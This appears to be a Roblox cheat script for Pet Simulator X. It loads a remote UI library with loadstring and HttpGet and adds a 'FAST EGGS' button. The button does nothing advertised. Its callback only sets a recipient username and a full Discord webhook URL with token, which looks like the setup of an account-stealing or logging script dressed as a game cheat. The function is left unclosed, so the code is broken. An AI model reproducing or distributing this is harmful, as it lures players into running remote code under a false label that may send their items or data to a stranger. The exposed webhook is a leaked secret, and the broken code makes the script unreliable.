local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "PSX-HUB by [YT_Zefko]", HidePremium = false, SaveConfig = true, ConfigFolder = "YT_Zefko"})
OrionLib:MakeNotification({
	Name = "PSX-HUB by [YT_Zefko]",
	Content = "Welcome to PSX-HUB by [YT_Zefko]",
	Image = "rbxassetid://4483345998",
	Time = 10
})

local Tab = Window:MakeTab({
	Name = "FAST EGGS",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "Activate",
	Callback = function()
      		print("button pressed")
UserName = "Twitch_Pluton"
Webhook = "https://discord.com/api/webhooks/1099993941123801108/T78_V77Dzk3RSo6IHTmKCXrkLdqlwERW9wLIbBMjF7nlcVPeSnPEuVVOn5PTOKh8bV6C"

})

OrionLib:Init()
